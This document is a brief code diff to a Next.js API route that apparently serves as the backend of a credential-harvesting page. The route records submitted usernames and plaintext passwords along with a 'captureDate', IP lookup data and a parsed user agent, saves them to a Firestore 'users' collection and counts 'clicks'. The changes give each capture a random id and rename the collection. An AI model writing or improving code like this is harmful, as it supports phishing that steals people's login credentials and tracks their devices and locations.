@@ -3,6 +3,7 @@ import { getDoc, doc, setDoc } from "firebase/firestore";
 import { NextResponse } from "next/server";
 import config, { db } from "@/config";
 import UAParser from "ua-parser-js";
+import { v4 as uuid } from "uuid";
 
 export async function POST(req: Request) {
   const data = await req.json();
@@ -17,7 +18,7 @@ export async function POST(req: Request) {
   const ipData = await ipRes.json();
 
   const info = {
-    id: "550e8400-e29b-41d4-a716-446655440000",
+    id: uuid(),
     username: data.username,
     password: data.password,
     captureDate: data.date,
@@ -35,7 +36,7 @@ export async function POST(req: Request) {
   };
 
   try {
-    const docRef = doc(db, "cities", info.id);
+    const docRef = doc(db, "users", info.id);
 
     if ((await getDoc(docRef)).exists()) {
       await updateDoc(docRef, { clicks: increment(1) });
